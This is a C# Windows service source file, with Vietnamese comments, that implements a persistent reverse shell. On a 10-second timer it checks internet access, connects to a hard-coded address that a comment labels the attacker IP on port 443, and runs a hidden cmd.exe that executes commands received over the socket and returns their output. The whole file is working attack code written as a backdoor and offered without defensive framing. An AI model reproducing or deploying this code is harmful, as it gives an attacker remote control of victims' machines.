using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace WindowsService3
{
    public partial class Service3 : ServiceBase
    {
        static StreamWriter streamWriter;
        Timer timer = new Timer();

        public Service3()
        {
            InitializeComponent();
        }

        public static void Reverse()
        {
            using (TcpClient client = new TcpClient("192.168.128.142", 443)) // tạo kết nối tcp tới ip attacker với port 443
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe"; // chạy process cmd
                        p.StartInfo.CreateNoWindow = true; // không hiện cửa sổ windows
                        p.StartInfo.UseShellExecute = false; // không dùng shell để thực thi
                        p.StartInfo.RedirectStandardOutput = true; // ghi lại input
                        p.StartInfo.RedirectStandardInput = true; // ghi lại output
                        p.StartInfo.RedirectStandardError = true; // ghi lại lỗi
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); 
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine()); // đọc lệnh 
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput); // thực thi lệnh trong cmd
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        // Hàm xử lí và gửi kết quả cmd
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        // Hàm kiểm tra http
        public static bool CheckInternetConnection()
        {
            var request = (HttpWebRequest)WebRequest.Create("https://google.com"); // gửi request đến trang web google 
            var response = (HttpWebResponse)request.GetResponse();
            if (response.StatusCode == HttpStatusCode.OK) // Kiểm tra kết quả respone
            {
                return true;
            }
            return false;
        }

        // Hàm ghi log
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
            "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
            ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 10000; // 10 giây
            timer.Enabled = true;
        }

        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            if (CheckInternetConnection())
                Reverse();
        }

        protected override void OnStop()
        {
        }
    }
}
